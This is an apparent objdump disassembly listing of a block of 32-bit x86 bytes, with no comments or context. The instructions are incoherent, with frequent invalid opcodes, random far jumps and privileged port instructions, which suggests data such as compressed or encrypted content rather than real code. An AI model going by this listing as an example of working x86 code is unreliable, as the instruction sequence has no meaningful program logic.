  41a148:	(bad)  
  41a149:	fbstp  TBYTE PTR [eax+0x0]
  41a14c:	cmp    eax,0xa6af3c63
  41a151:	and    dh,bh
  41a153:	test   al,0xaa
  41a155:	(bad)  
  41a156:	dec    ebx
  41a157:	pop    ebx
  41a158:	fdiv   st(5),st
  41a15a:	daa    
  41a15b:	mov    ecx,0x1fac730f
  41a160:	fwait
  41a161:	(bad)  
  41a162:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a164:	dec    edi
  41a165:	out    0xc9,al
  41a167:	adc    eax,0x9778092c
  41a16c:	push   ss
  41a16d:	xor    ah,BYTE PTR [esi-0x29f1c3f4]
  41a173:	jo     0x41a162
  41a175:	add    eax,0x58fd84e6
  41a17a:	hlt    
  41a17b:	sbb    DWORD PTR [ecx+0x16791b7b],eax
  41a181:	and    al,BYTE PTR [ebx]
  41a183:	(bad)  
  41a185:	jne    0x41a154
  41a187:	cmp    eax,0x2f2e3824
  41a18c:	retf   0xa6bb
  41a18f:	or     BYTE PTR [eax],al
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	mov    dh,0x37
  41a202:	pop    ss
  41a203:	or     esp,esp
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	pop    eax
  41a20d:	outs   dx,BYTE PTR ds:[esi]
  41a20e:	ins    DWORD PTR es:[edi],dx
  41a20f:	cld    
  41a210:	mov    cl,BYTE PTR [ecx-0x1f]
  41a213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a214:	push   edx
  41a215:	xchg   al,ah
  41a217:	test   eax,0x433e7182
  41a21c:	jg     0x41a269
  41a21e:	push   ebp
  41a21f:	sub    dh,BYTE PTR ds:0xb52c6f7d
  41a225:	dec    edi
  41a226:	fadd   st(6),st
  41a228:	lods   eax,DWORD PTR ds:[esi]
  41a229:	xor    DWORD PTR [edx-0x53d489b],edi
  41a22f:	(bad)  
  41a232:	add    eax,0xc80b43af
  41a237:	(bad)  
  41a238:	xchg   edi,eax
  41a239:	(bad)  
  41a23a:	out    0x7e,eax
  41a23c:	fnstenv [ecx-0x4c]
  41a23f:	adc    dh,0x87
  41a242:	bound  eax,QWORD PTR [ebp-0x66]
  41a245:	leave  
  41a246:	sbb    al,0x57
  41a248:	test   ah,bh
  41a24a:	loope  0x41a282
  41a24c:	mov    WORD PTR [ebx+0x3f],gs
  41a24f:	push   0x29
  41a251:	test   al,0x72
  41a253:	lock and ebp,DWORD PTR [edi+0x6f6ad82d]
  41a25a:	ret    
  41a25b:	inc    ebx
  41a25c:	mov    esp,0x4bcd4301
  41a261:	push   ss
  41a262:	mov    bl,0x5c
  41a264:	mov    WORD PTR [edx-0x2c72037a],cs
  41a26a:	xor    eax,0x52119440
  41a26f:	popa   
  41a270:	mov    esi,0xe4823216
  41a275:	aaa    
  41a276:	fidiv  DWORD PTR [ebx-0x34]
  41a279:	jmp    0xcb451041
  41a27e:	mov    bl,0x3
  41a280:	retf   0x6ec
  41a283:	imul   edx
  41a285:	or     al,0xf1
  41a287:	adc    DWORD PTR [edx-0x2c26916d],esi
  41a28d:	mov    esi,0x4c4a8cd7
  41a292:	call   0x5f4d:0x2635c1bc
  41a299:	sub    BYTE PTR [ebx],ch
  41a29b:	cli    
  41a29c:	jmp    0x24f034ea
  41a2a1:	hlt    
  41a2a2:	popa   
  41a2a3:	daa    
  41a2a4:	push   cs
  41a2a5:	push   eax
  41a2a6:	or     DWORD PTR [ecx-0x63674f2a],edi
  41a2ac:	mov    edi,eax
  41a2ae:	je     0x41a24b
  41a2b0:	inc    edx
  41a2b1:	sub    al,0x56
  41a2b3:	es (bad) 
  41a2b5:	push   esp
  41a2b6:	vxorps ymm7,ymm5,YMMWORD PTR [eax+0x1f]
  41a2bb:	stc    
  41a2bc:	(bad)
  41a2bf:	daa    
  41a2c0:	inc    ecx
  41a2c1:	outs   dx,DWORD PTR ds:[esi]
  41a2c2:	retf   
  41a2c3:	call   0x9b8f:0x67437fe
  41a2ca:	ds inc eax
  41a2cc:	and    ah,BYTE PTR [eax+0xdc8e15a]
  41a2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d3:	pop    ebp
  41a2d4:	or     BYTE PTR [ecx-0x3b943495],bl
  41a2da:	cmp    al,0x36
  41a2dc:	fnstenv [esi-0x4b]
  41a2df:	lahf   
  41a2e0:	lahf   
  41a2e1:	adc    edi,edi
  41a2e3:	xchg   DWORD PTR [esi-0x3c0e8e05],esp
  41a2e9:	pop    ebx
  41a2ea:	cmp    BYTE PTR [edi+0x567bfddc],0x46
  41a2f1:	mov    bh,0xc6
  41a2f3:	push   eax
  41a2f4:	mov    ebx,0xa52ac5d
  41a2f9:	cmp    ch,BYTE PTR [ecx]
  41a2fb:	adc    al,0x65
  41a2fd:	or     BYTE PTR [edx+ebp*2],bh
  41a300:	enter  0xde6a,0x29
  41a304:	dec    ecx
  41a305:	jl     0x41a2c5
  41a307:	in     eax,0xf0
  41a309:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a30b:	mov    edi,0xe0a700be
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	mov    bl,BYTE PTR [eax+0x15e86870]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    al,0x1
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	jmp    FWORD PTR [ebx-0x4715c213]
  41a392:	std    
  41a393:	ss retf 
  41a395:	loope  0x41a3d7
  41a397:	imul   edi,eax,0xb7e9c381
  41a39d:	es cdq 
  41a39f:	cli    
  41a3a0:	ficom  WORD PTR [eax-0x5a]
  41a3a3:	cld    
  41a3a4:	mov    bh,0x87
  41a3a6:	stc    
  41a3a7:	dec    ebx
  41a3a8:	dec    eax
  41a3a9:	loope  0x41a3d5
  41a3ab:	jmp    DWORD PTR [edx]
  41a3ad:	cmp    DWORD PTR [ebp+0x8],0x38a3c19e
  41a3b4:	and    DWORD PTR [esi-0x16],ecx
  41a3b7:	adc    BYTE PTR [esi+edi*1-0x77ec6362],ah
  41a3be:	call   0xace2862f
  41a3c3:	in     al,dx
  41a3c4:	add    DWORD PTR [edx-0x5d12173c],eax
  41a3ca:	fidiv  DWORD PTR [edx-0xf]
  41a3cd:	jb     0x41a396
  41a3cf:	push   ds
  41a3d0:	or     BYTE PTR [edi+0x102341e6],al
  41a3d6:	mov    eax,ds:0x691e6e62
  41a3db:	retf   0x6053
  41a3de:	ds pop ds
  41a3e0:	push   0x9
  41a3e2:	dec    ebp
  41a3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e4:	imul   esi,DWORD PTR [edx+0x25],0x39f10456
  41a3eb:	cmp    ebx,edi
  41a3ed:	in     al,0x87
  41a3ef:	call   DWORD PTR [edi+0x71153cdf]
  41a3f5:	lock xor BYTE PTR [edx],dl
  41a3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f9:	imul   esp,DWORD PTR [edx-0x3b7dd2b1],0x51ff3ab6
  41a403:	iret   
  41a404:	xchg   ebx,eax
  41a405:	and    bl,ah
  41a407:	mov    ah,0xa5
  41a409:	pop    esi
  41a40a:	sbb    ebp,DWORD PTR [ebp-0x2d]
  41a40d:	cdq    
  41a40e:	(bad)
  41a411:	cmp    ah,BYTE PTR [edi]
  41a413:	daa    
  41a414:	xchg   ecx,eax
  41a415:	inc    eax
  41a416:	retf   0x428f
  41a419:	mov    ch,0x84
  41a41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41c:	or     BYTE PTR [edx+0x602e4004],dl
  41a422:	dec    edx
  41a423:	jecxz  0x41a465
  41a425:	jg     0x41a471
  41a427:	rol    DWORD PTR [eax+0x62fd440e],1
  41a42d:	sub    DWORD PTR [edi],edx
  41a42f:	addr16 mov dh,0xc4
  41a432:	ss in  eax,0xd6
  41a435:	lds    edi,FWORD PTR [esp+ecx*4]
  41a438:	adc    al,0x69
  41a43a:	pop    ecx
  41a43b:	xor    ch,BYTE PTR [edx+eax*2-0x6d]
  41a43f:	push   esi
  41a440:	lods   al,BYTE PTR ds:[esi]
  41a441:	pusha  
  41a442:	pop    ebx
  41a443:	rcl    BYTE PTR [edi],0x74
  41a446:	push   0x672c0b42
  41a44b:	shr    DWORD PTR [esi],cl
  41a44d:	mov    ecx,0xa0ab14b3
  41a452:	jl     0x41a3f9
  41a454:	sahf   
  41a455:	mov    ah,0x5d
  41a457:	mov    ds:0xd93b0e88,eax
  41a45c:	cmp    BYTE PTR [eax+0x64],bh
  41a45f:	ja     0x41a437
  41a461:	(bad)  
  41a462:	jmp    0x41a44d
  41a464:	into   
  41a465:	jno    0x41a42a
  41a467:	adc    esi,esp
  41a469:	(bad)  
  41a46a:	pop    esp
  41a46b:	jo     0x41a44b
  41a46d:	das    
  41a46e:	in     eax,dx
  41a46f:	in     al,0x29
  41a471:	xchg   WORD PTR [ecx-0x67],ax
  41a475:	mov    dl,BYTE PTR [eax+0x457b1100]
  41a47b:	aas    
  41a47c:	and    ebx,DWORD PTR [ebx+ebp*2+0x78]
  41a480:	dec    ecx
  41a481:	or     al,0xf7
  41a483:	or     DWORD PTR [edx-0x27],ebp
  41a486:	mov    ecx,0x85916667
  41a48b:	loop   0x41a488
  41a48d:	xor    ah,bl
  41a48f:	jle    0x41a491
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	ss mov cl,0x23
  41a503:	jge    0x41a4f1
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	not    BYTE PTR [ebp+edi*2+0x3c]
  41a510:	xor    esi,ebp
  41a512:	adc    edi,eax
  41a514:	jecxz  0x41a50e
  41a516:	retf   0xcde8
  41a519:	xor    eax,0x30612692
  41a51e:	ja     0x41a538
  41a520:	cli    
  41a521:	je     0x41a53f
  41a523:	(bad)  
  41a524:	in     eax,dx
  41a525:	iret   
  41a526:	push   0x42d26a92
  41a52b:	aam    0x44
  41a52d:	xor    bl,BYTE PTR [eax-0xb]
  41a530:	js     0x41a530
  41a532:	cmp    cl,dl
  41a534:	sub    dh,bh
  41a536:	xor    bh,al
  41a538:	(bad)  
  41a539:	xor    DWORD PTR [ecx-0xc6a4765],esi
  41a53f:	in     eax,0xbc
  41a541:	inc    ebp
  41a542:	sbb    DWORD PTR [edi-0x7a],edi
  41a545:	inc    ecx
  41a546:	ss push cs
  41a548:	je     0x41a582
  41a54a:	stc    
  41a54b:	adc    al,BYTE PTR [edx+0x7cad6e35]
  41a551:	shl    esp,0x93
  41a554:	pop    esp
  41a555:	adc    esp,ecx
  41a557:	cwde   
  41a558:	lock std 
  41a55a:	test   ch,0x31
  41a55d:	ins    BYTE PTR es:[edi],dx
  41a55e:	push   cs
  41a55f:	jge    0x41a5a3
  41a561:	and    BYTE PTR [esi-0x5c],al
  41a564:	dec    ecx
  41a565:	pop    esp
  41a566:	sub    ch,BYTE PTR [ebp+0x5c187e43]
  41a56c:	xchg   esi,eax
  41a56d:	jns    0x41a577
  41a56f:	fdiv   st,st(2)
  41a571:	add    dh,BYTE PTR [ecx+edi*4]
  41a574:	dec    esp
  41a575:	daa    
  41a576:	push   0x534772a
  41a57b:	jle    0x41a52d
  41a57d:	dec    eax
  41a57e:	and    eax,0xe47b6f26
  41a583:	retf   
  41a584:	out    0x57,eax
  41a586:	dec    ecx
  41a587:	scas   al,BYTE PTR es:[edi]
  41a588:	cli    
  41a589:	xchg   ecx,eax
  41a58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58b:	xchg   esp,eax
  41a58c:	ss cld 
  41a58e:	push   0xffffffff
  41a590:	(bad)  
  41a591:	dec    ebx
  41a592:	sub    eax,0xc7e35580
  41a597:	fsub   st,st(4)
  41a599:	dec    edx
  41a59a:	push   0xf99b55d5
  41a59f:	(bad)  
  41a5a0:	cmc    
  41a5a1:	jp     0x41a61f
  41a5a3:	mov    dl,0xf4
  41a5a5:	mov    cl,0x24
  41a5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a8:	retf   
  41a5a9:	jmp    0x3bb5:0x2aca970f
  41a5b0:	pop    edx
  41a5b1:	push   es
  41a5b2:	add    eax,0x9605b6ca
  41a5b7:	adc    bl,BYTE PTR [esi+0x783c3213]
  41a5bd:	mov    edi,0xb93e42eb
  41a5c2:	jp     0x41a624
  41a5c4:	xlat   BYTE PTR ds:[ebx]
  41a5c5:	jne    0x41a556
  41a5c7:	mov    ch,0xa3
  41a5c9:	dec    esi
  41a5ca:	push   eax
  41a5cb:	or     eax,0x9df5bd89
  41a5d0:	stc    
  41a5d1:	fistp  DWORD PTR [ebx+0x52464308]
  41a5d7:	repz cwde 
  41a5d9:	fcmove st,st(5)
  41a5db:	sbb    DWORD PTR [edx-0x69],eax
  41a5de:	add    ecx,0xa688adaa
  41a5e4:	jnp    0x41a56c
  41a5e6:	xor    BYTE PTR [ecx+0x7687af75],bh
  41a5ec:	loopne 0x41a572
  41a5ee:	fxch   st(6)
  41a5f1:	mov    DWORD PTR [edi+0x670863d4],esi
  41a5f7:	and    BYTE PTR [ebx+0x45],dl
  41a5fa:	xchg   ecx,eax
  41a5fb:	inc    edx
  41a5fc:	loop   0x41a631
  41a5fe:	call   0x79bf:0x1d1ecc90
  41a605:	rol    edi,0x44
  41a608:	xor    edx,edi
  41a60a:	dec    esi
  41a60b:	xchg   ebp,eax
  41a60c:	dec    eax
  41a60d:	xchg   ecx,eax
  41a60e:	xor    al,0xe1
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x2d54a625
  41a682:	shl    eax,1
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	push   cs
  41a68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a68e:	and    eax,0xb88ed2e5
  41a693:	(bad)  
  41a694:	fsubrp st(0),st
  41a696:	pop    ecx
  41a697:	mov    dl,0x3
  41a699:	lea    ebp,[ebx-0x42]
  41a69c:	mov    edi,0x50bea07d
  41a6a1:	mov    BYTE PTR [edx+0x21],dl
  41a6a4:	stos   DWORD PTR es:[edi],eax
  41a6a5:	ss fcmovnbe st,st(5)
  41a6a8:	loop   0x41a661
  41a6aa:	(bad)  
  41a6ab:	jae    0x41a69b
  41a6ad:	and    DWORD PTR [ebx],ecx
  41a6af:	or     dh,dh
  41a6b1:	jb     0x41a6cf
  41a6b3:	adc    BYTE PTR [edi],dh
  41a6b5:	jne    0x41a6b4
  41a6b7:	and    dh,BYTE PTR [ebx-0x1b]
  41a6ba:	mov    al,0x6c
  41a6bc:	cwde   
  41a6bd:	sub    DWORD PTR [edi+0x50995915],ecx
  41a6c3:	jge    0x41a6c7
  41a6c5:	ss das 
  41a6c7:	dec    esp
  41a6c8:	clc    
  41a6c9:	rcl    DWORD PTR [edi+edx*1-0x80],cl
  41a6cd:	ud0    esp,esp
  41a6d0:	inc    edi
  41a6d1:	cmp    eax,0x1cac72fb
  41a6d6:	mov    dh,0x15
  41a6d8:	xor    BYTE PTR [ecx],bh
  41a6da:	stos   BYTE PTR es:[edi],al
  41a6db:	rcr    DWORD PTR [edx+0x7aaded24],1
  41a6e1:	mov    esp,0x4bdc5db
  41a6e6:	sub    ah,cl
  41a6e8:	and    eax,0x744ea522
  41a6ed:	iret   
  41a6ee:	mov    eax,0x523b250a
  41a6f3:	arpl   cx,cx
  41a6f5:	cdq    
  41a6f6:	xor    BYTE PTR [ecx],ah
  41a6f8:	jbe    0x41a6b9
  41a6fa:	mov    dh,0x1
  41a6fc:	jae    0x41a723
  41a6fe:	shl    DWORD PTR [esp+eax*1-0x3],0x3a
  41a703:	inc    ecx
  41a704:	add    eax,0x8728e95f
  41a709:	lds    dx,DWORD PTR [ecx]
  41a70c:	xchg   esp,eax
  41a70d:	fmul   QWORD PTR cs:[edi+0x4e]
  41a711:	arpl   WORD PTR [edi-0x216fbceb],bp
  41a717:	jbe    0x41a786
  41a719:	jl     0x41a709
  41a71b:	jns    0x41a76a
  41a71d:	and    BYTE PTR [edx+0x1f],ch
  41a720:	jge    0x41a6f2
  41a722:	push   ebx
  41a723:	ja     0x41a73a
  41a725:	arpl   WORD PTR [eax],ax
  41a727:	pop    ds
  41a728:	gs out dx,al
  41a72a:	sbb    eax,0xd1228e61
  41a72f:	adc    eax,0x9169bc4b
  41a734:	xchg   DWORD PTR [eax],ebx
  41a736:	xor    al,0x63
  41a738:	push   ecx
  41a739:	xor    DWORD PTR [ebp+0x1fdc1a86],edi
  41a73f:	add    DWORD PTR [edx],ebp
  41a741:	pop    eax
  41a742:	popf   
  41a743:	xor    dh,dl
  41a745:	pop    ss
  41a746:	dec    esp
  41a747:	fild   QWORD PTR [ebp-0x57]
  41a74a:	jne    0x41a756
  41a74c:	mov    al,ds:0x5197ecce
  41a751:	cmp    bh,cl
  41a753:	repz popa 
  41a755:	xchg   BYTE PTR [ebp+esi*1-0x21],bh
  41a759:	dec    esi
  41a75a:	not    BYTE PTR [eax-0x71af40ef]
  41a760:	add    dh,ah
  41a762:	push   edi
  41a763:	push   ss
  41a764:	inc    eax
  41a765:	outs   dx,BYTE PTR ds:[esi]
  41a766:	pop    ebx
  41a767:	dec    eax
  41a768:	push   edx
  41a769:	cmp    BYTE PTR [eax],0x76
  41a76c:	cmp    al,0x8
  41a76e:	ret    
  41a76f:	ss gs push ss
  41a772:	mov    bh,0xa8
  41a774:	sub    eax,0x939ce11c
  41a779:	out    dx,al
  41a77a:	add    DWORD PTR [edx-0x75],esp
  41a77d:	lock and eax,0x886af7ff
  41a783:	add    BYTE PTR [ecx],bh
  41a785:	push   esp
  41a786:	gs jmp 0x9f3b:0xd128d887
  41a78e:	or     al,0x15
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x7e5327ca,al
  41a801:	aam    0xf4
  41a803:	xchg   ebp,eax
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	loopne 0x41a7ba
  41a80e:	in     al,0x5f
  41a810:	repnz or al,0x3d
  41a813:	iret   
  41a814:	shr    BYTE PTR [esi+0x73],cl
  41a817:	or     ebx,DWORD PTR [ebx+0x6f]
  41a81a:	add    ecx,DWORD PTR [ebp-0x5]
  41a81d:	xchg   DWORD PTR [ebx-0x34],eax
  41a820:	push   ds
  41a821:	shr    ebx,cl
  41a823:	cmova  esi,eax
  41a826:	lods   eax,DWORD PTR ds:[esi]
  41a827:	retf   0x91e9
  41a82a:	push   esp
  41a82b:	xchg   BYTE PTR [esi+0x1b],dl
  41a82e:	fsub   QWORD PTR [ebp+0x447d2e90]
  41a834:	fwait
  41a835:	pushf  
  41a836:	cdq    
  41a837:	mov    DWORD PTR [ebx+0x796280a9],ebp
  41a83d:	rol    DWORD PTR [eax-0x2a],cl
  41a840:	cmp    eax,0xec80b346
  41a845:	shl    DWORD PTR [edi+0x68],0x1b
  41a849:	ret    
  41a84a:	xor    al,0x75
  41a84c:	cmp    DWORD PTR [edx+0x202b923b],0x78
  41a853:	mov    ds:0x6d72cd56,al
  41a858:	dec    esp
  41a859:	test   BYTE PTR [edx+esi*2+0x112fa01b],0x86
  41a861:	jle    0x41a854
  41a863:	imul   eax,esi,0xc81a8741
  41a869:	nop
  41a86a:	mov    ch,0xb6
  41a86c:	cmp    BYTE PTR [edi+ecx*4],dh
  41a86f:	test   eax,0x8cedcf5a
  41a874:	loop   0x41a828
  41a876:	add    esi,DWORD PTR [ebx]
  41a878:	cmp    eax,esp
  41a87a:	sbb    al,0x16
  41a87c:	push   ds
  41a87d:	(bad)  
  41a87e:	shr    DWORD PTR [edi-0x27],cl
  41a881:	cmp    eax,0xcec81084
  41a886:	stos   DWORD PTR es:[edi],eax
  41a887:	ins    DWORD PTR es:[edi],dx
  41a888:	cld    
  41a889:	call   0xa280:0x80c7a8ca
  41a890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a891:	jae    0x41a85a
  41a893:	jmp    0x3fc1d4d7
  41a898:	inc    eax
  41a899:	cli    
  41a89a:	adc    edi,DWORD PTR [ecx-0x5782cb1e]
  41a8a0:	xchg   ecx,eax
  41a8a1:	sbb    DWORD PTR [ecx],ecx
  41a8a3:	in     eax,dx
  41a8a4:	mov    BYTE PTR [ebx-0x64],bl
  41a8a7:	into   
  41a8a8:	or     esp,DWORD PTR [ebx]
  41a8aa:	inc    edi
  41a8ab:	out    0x66,eax
  41a8ad:	dec    edx
  41a8ae:	mov    ds:0x982557fa,eax
  41a8b3:	dec    ecx
  41a8b4:	dec    ebx
  41a8b5:	cmp    eax,0x9f9d34a6
  41a8ba:	add    DWORD PTR [eax+eax*8-0x31],ecx
  41a8be:	xchg   edx,eax
  41a8bf:	cmp    ch,bh
  41a8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c3:	lds    eax,FWORD PTR ds:0xc3f85190
  41a8c9:	adc    ch,dh
  41a8cb:	or     edi,DWORD PTR [ebx+0x1b]
  41a8ce:	jno    0x41a8b9
  41a8d0:	or     eax,0xed8ca804
  41a8d5:	cs adc al,0x7f
  41a8d8:	call   0x833c:0x1689512e
  41a8df:	cmc    
  41a8e0:	(bad)  [ebp-0x78]
  41a8e3:	and    BYTE PTR [eax-0x6985ea7c],0x9a
  41a8ea:	pop    edi
  41a8eb:	xchg   esi,eax
  41a8ec:	cmp    BYTE PTR [esi-0x34f1ba1c],dh
  41a8f2:	jmp    0xefdc:0x58a76539
  41a8f9:	xchg   edx,eax
  41a8fa:	push   ecx
  41a8fb:	ins    BYTE PTR es:[edi],dx
  41a8fc:	rol    DWORD PTR [edi],1
  41a8fe:	and    BYTE PTR [esi+0x741b459c],dh
  41a904:	xchg   ch,bh
  41a906:	add    eax,ecx
  41a908:	xchg   eax,esi
  41a90a:	or     DWORD PTR [eax+0x48],0xffffffb2
  41a90e:	adc    al,0xd0
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	inc    ebx
  41a981:	mov    eax,ds:0x19f8032e
  41a986:	add    DWORD PTR [eax],eax
  41a988:	add    al,0x1
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	es jmp 0x5b15:0xa3ff275a
  41a994:	or     eax,0xd208fb97
  41a999:	scas   al,BYTE PTR es:[edi]
  41a99a:	sti    
  41a99b:	mov    al,0x5c
  41a99d:	jle    0x41a995
  41a99f:	ds dec esp
  41a9a1:	and    ch,bl
  41a9a3:	cs inc ecx
  41a9a5:	and    BYTE PTR [ebp+ecx*4+0x1d],0x83
  41a9aa:	mov    ch,0x61
  41a9ac:	(bad)  
  41a9ad:	enter  0x94a5,0xa5
  41a9b1:	lods   eax,DWORD PTR ds:[esi]
  41a9b2:	mov    eax,0xa41f187a
  41a9b7:	dec    edi
  41a9b8:	and    DWORD PTR [ebx+0x1e],0x47
  41a9bc:	add    BYTE PTR [edi-0x75],0x5d
  41a9c0:	push   edi
  41a9c1:	jns    0x41a9e7
  41a9c3:	cmp    DWORD PTR [edx-0x34],ebp
  41a9c6:	sbb    bp,di
  41a9c9:	fcmovne st,st(6)
  41a9cb:	sbb    al,0xc5
  41a9cd:	cmp    ebx,DWORD PTR [esi]
  41a9cf:	add    ch,BYTE PTR [eax+ecx*4]
  41a9d2:	inc    edi
  41a9d3:	adc    al,0x5f
  41a9d5:	push   esp
  41a9d6:	je     0x41aa2a
  41a9d8:	inc    esi
  41a9d9:	cmp    DWORD PTR [edx-0x184afb2d],esi
  41a9df:	mov    al,0xd5
  41a9e1:	jo     0x41aa3f
  41a9e3:	nop
  41a9e4:	add    eax,0xcae0ceff
  41a9e9:	mov    ds:0xfbac8f74,al
  41a9ee:	push   esp
  41a9ef:	fcomi  st,st(4)
  41a9f1:	xchg   al,cl
  41a9f3:	fwait
  41a9f4:	sub    cl,BYTE PTR [ecx+0x246dfa6e]
  41a9fa:	push   ecx
  41a9fb:	xchg   esi,eax
  41a9fc:	jge    0x41a9ea
  41a9fe:	fwait
  41a9ff:	add    WORD PTR [edx-0x59951bd4],cx
  41aa06:	mov    cl,0xdc
  41aa08:	je     0x41a9be
  41aa0a:	push   ebp
  41aa0b:	xor    ah,BYTE PTR [ebp-0x54d1d980]
  41aa11:	out    dx,al
  41aa12:	sub    al,0xb8
  41aa14:	xor    ax,0x4462
  41aa18:	mov    esi,DWORD PTR [ebx]
  41aa1a:	jp     0x41aa01
  41aa1c:	shl    DWORD PTR [ecx+0x7b],cl
  41aa1f:	pop    ss
  41aa20:	loopne 0x41aa8c
  41aa22:	xor    DWORD PTR [eax],esp
  41aa24:	and    dl,ch
  41aa26:	add    esp,DWORD PTR [esi]
  41aa28:	mov    ebx,0xe7cc503c
  41aa2d:	push   0xffffff85
  41aa2f:	enter  0x3137,0x27
  41aa33:	aad    0x22
  41aa35:	cli    
  41aa36:	mov    ds:0xbcf089e0,al
  41aa3b:	mov    ecx,0xf3ccb584
  41aa40:	sbb    eax,0x16db5322
  41aa45:	inc    eax
  41aa46:	push   ecx
  41aa47:	sbb    al,0x24
  41aa49:	jecxz  0x41aa9b
  41aa4b:	cmp    ecx,edi
  41aa4d:	(bad)  
  41aa4e:	jp     0x41aa1e
  41aa50:	pushf  
  41aa51:	je     0x41aa12
  41aa53:	xchg   esi,eax
  41aa54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa55:	fstp   TBYTE PTR [ebp+esi*2-0x303f80b1]
  41aa5c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa5e:	int    0x30
  41aa60:	pop    ecx
  41aa61:	not    BYTE PTR [ebx]
  41aa63:	xor    DWORD PTR [edx-0x1],0xfffffff3
  41aa67:	cwde   
  41aa68:	mov    esi,0xbef4c307
  41aa6d:	dec    ecx
  41aa6e:	pushw  ss
  41aa70:	loop   0x41aa30
  41aa72:	or     dl,BYTE PTR [ecx+0x10]
  41aa75:	loop   0x41aae3
  41aa77:	mov    WORD PTR [ebx+0x2b],gs
  41aa7a:	aam    0xff
  41aa7c:	mov    ch,0x2b
  41aa7e:	dec    ebx
  41aa7f:	add    al,BYTE PTR [ebx+0x18]
  41aa82:	scas   al,BYTE PTR es:[edi]
  41aa83:	iret   
  41aa84:	call   0xc0cd:0xaf45d47f
  41aa8b:	push   esi
  41aa8c:	pop    ebp
  41aa8d:	push   ds
  41aa8e:	xor    DWORD PTR [edx+0x0],ebx
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	xor    eax,0xfc0d964b
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	add    eax,0x19ead39d
  41ab11:	adc    eax,DWORD PTR [eax]
  41ab13:	jle    0x41aad8
  41ab15:	sub    al,0x2
  41ab17:	repnz add eax,0x6a58db1c
  41ab1d:	sub    DWORD PTR [edi-0x2],edx
  41ab20:	fidivr WORD PTR [edi+ebp*1]
  41ab23:	pop    ecx
  41ab24:	xor    esi,edi
  41ab26:	cmp    edx,ebp
  41ab28:	push   esp
  41ab29:	fnstsw WORD PTR [ebp-0xf]
  41ab2c:	(bad)  
  41ab2d:	jl     0x41ab34
  41ab2f:	ins    BYTE PTR es:[edi],dx
  41ab30:	loope  0x41aac3
  41ab32:	push   edx
  41ab33:	pop    edi
  41ab34:	xor    esp,DWORD PTR [ecx+0x5c756dad]
  41ab3a:	cmp    BYTE PTR [ebx+ebx*8],ch
  41ab3d:	ja     0x41ab41
  41ab3f:	mov    dl,BYTE PTR [ebx+0x39]
  41ab42:	fidivr WORD PTR [edi+0x56]
  41ab45:	jb     0x41ab60
  41ab47:	pop    ds
  41ab48:	je     0x41ab43
  41ab4a:	add    DWORD PTR [eax-0x4d],0xd033cb41
  41ab51:	out    dx,eax
  41ab52:	mov    bl,0x13
  41ab54:	or     cl,BYTE PTR [esi+0x3dfa8ef4]
  41ab5a:	aaa    
  41ab5b:	jb     0x41ab1c
  41ab5d:	jae    0x41ab7c
  41ab5f:	sub    BYTE PTR [ecx],bh
  41ab61:	xchg   edx,eax
  41ab62:	or     DWORD PTR [ebp+0x57],0x1be82232
  41ab69:	mov    ecx,fs
  41ab6b:	inc    ebx
  41ab6c:	aas    
